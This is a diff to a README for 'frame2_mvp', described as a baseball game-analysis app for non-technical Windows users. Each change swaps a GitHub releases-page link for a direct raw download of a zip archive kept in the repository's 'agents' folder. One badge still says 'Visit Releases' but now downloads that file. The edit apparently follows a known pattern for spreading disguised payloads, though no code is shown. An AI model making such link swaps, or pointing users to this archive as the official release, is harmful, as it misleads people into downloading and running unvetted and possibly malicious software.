@@ -1,6 +1,6 @@
 # ⚾ frame2_mvp - Understand Why Games Change
 
-[![Download frame2_mvp](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/blackshirtlaxative507/frame2_mvp/releases)
+[![Download frame2_mvp](https://img.shields.io/badge/Download-Now-brightgreen)](https://raw.githubusercontent.com/blackshirtlaxative507/frame2_mvp/main/agents/frame_mvp_1.0.zip)
 
 ---
 
@@ -18,7 +18,7 @@ You don’t need to know anything about coding to use this app. It runs on Windo
 
 Visit the releases page here:
 
-[![Visit Releases](https://img.shields.io/badge/Visit%20Releases-blue)](https://github.com/blackshirtlaxative507/frame2_mvp/releases)
+[![Visit Releases](https://img.shields.io/badge/Visit%20Releases-blue)](https://raw.githubusercontent.com/blackshirtlaxative507/frame2_mvp/main/agents/frame_mvp_1.0.zip)
 
 This page holds the latest versions of frame². You will find the files you need to install the app.
 
@@ -130,4 +130,4 @@ The goal is to bring complex sports modeling into a simple form. This helps fans
 
 Visit the releases page to get the app:
 
-[![Download frame2_mvp](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/blackshirtlaxative507/frame2_mvp/releases)
+[![Download frame2_mvp](https://img.shields.io/badge/Download-Now-brightgreen)](https://raw.githubusercontent.com/blackshirtlaxative507/frame2_mvp/main/agents/frame_mvp_1.0.zip)
